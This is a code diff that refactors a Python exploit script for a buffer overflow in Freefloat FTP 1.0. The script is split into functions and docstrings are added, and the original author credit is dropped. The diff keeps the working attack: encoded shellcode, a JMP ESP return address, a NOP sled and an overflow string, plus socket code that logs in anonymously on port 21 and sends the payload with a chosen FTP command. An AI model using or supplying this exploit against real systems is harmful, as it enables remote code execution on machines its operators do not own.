@@ -4,18 +4,14 @@ import time
 import struct
 
 def print_usage():
-    print(f"[-]Usage: {sys.argv[0]} <target addr> <command>\r")
-    print("[-]For example [filename.py 192.168.1.10 PWND] would do the trick.")
-    print("[-]Other options: AUTH, APPE, ALLO, ACCT")
+    """Prints usage instructions and exits the program."""
+    print(f"[-] Usage: {sys.argv[0]} <target addr> <command>")
+    print("[-] For example: [filename.py 192.168.1.10 PWND] would do the trick.")
+    print("[-] Other options: AUTH, APPE, ALLO, ACCT")
     sys.exit(0)
 
-def main():
-    if len(sys.argv) < 3:
-        print_usage()
-
-    target = sys.argv[1]
-    command = sys.argv[2]
-
+def create_payload():
+    """Creates the shellcode payload for the buffer overflow attack."""
     shellcode = (
         b"\xbf\x5c\x2a\x11\xb3\xd9\xe5\xd9\x74\x24\xf4\x5d\x33\xc9"
         b"\xb1\x56\x83\xc5\x04\x31\x7d\x0f\x03\x7d\x53\xc8\xe4\x4f"
@@ -46,29 +42,37 @@ def main():
         b"\xba\x1e\x53\x31"
     )
 
-    ret = struct.pack('<L', 0x7C874413)
+    ret = struct.pack('<L', 0x7C874413)  # JMP ESP address in kernel32.dll
     padding = b"\x90" * 150
     crash = b"\x41" * 246 + ret + padding + shellcode
 
-    print("[*] Freefloat FTP 1.0 Any Non Implemented Command Buffer Overflow")
-    print("[*] Author: Craig Freyman (@cd1zz)")
+    return crash
+
+def main():
+    if len(sys.argv) < 3:
+        print_usage()
+
+    target = sys.argv[1]
+    command = sys.argv[2]
+
+    crash = create_payload()
+
     print(f"[*] Connecting to {target}")
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        s.connect((target, 21))
-    except Exception as e:
-        print(f"[-] Connection to {target} failed: {e}")
-        sys.exit(0)
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        try:
+            s.connect((target, 21))
+        except Exception as e:
+            print(f"[-] Connection to {target} failed: {e}")
+            sys.exit(0)
 
-    print(f"[*] Sending {len(crash)} byte crash with {command} command...")
-    s.send(b"USER anonymous\r\n")
-    s.recv(1024)
-    s.send(b"PASS \r\n")
-    s.recv(1024)
-    s.send(command.encode() + b" " + crash + b"\r\n")
-    time.sleep(4)
-    s.close()
+        print(f"[*] Sending {len(crash)} byte crash with {command} command...")
+        s.sendall(b"USER anonymous\r\n")
+        s.recv(1024)
+        s.sendall(b"PASS \r\n")
+        s.recv(1024)
+        s.sendall(command.encode() + b" " + crash + b"\r\n")
+        time.sleep(4)
 
 if __name__ == "__main__":
     main()
